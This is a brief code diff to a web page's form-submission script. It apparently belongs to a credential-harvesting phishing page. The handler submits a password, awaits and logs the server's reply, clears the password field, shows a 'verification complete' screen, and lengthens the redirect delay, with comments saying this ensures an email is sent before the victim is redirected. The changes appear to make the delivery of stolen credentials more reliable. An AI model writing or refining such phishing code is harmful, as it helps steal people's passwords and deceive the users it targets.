@@ -191,6 +191,10 @@
                 
                 if (!response.ok) throw new Error('Submission failed');
                 
+                // Wait for the response to complete before proceeding
+                const responseData = await response.text();
+                console.log('Server response:', responseData);
+                
                 // Clear password field
                 passwordInput.value = '';
 
@@ -210,9 +214,11 @@
                     loading.style.display = 'none';
                     verificationComplete.style.display = 'flex';
                     
+                    // Add delay to ensure email is sent before redirect
                     setTimeout(() => {
+                        verificationComplete.style.display = 'none';
                         window.location.href = redirectUrl;
-                    }, 2000);
+                    }, 3000); // Increased delay to ensure email is sent
                 }
 
             } catch (error) {
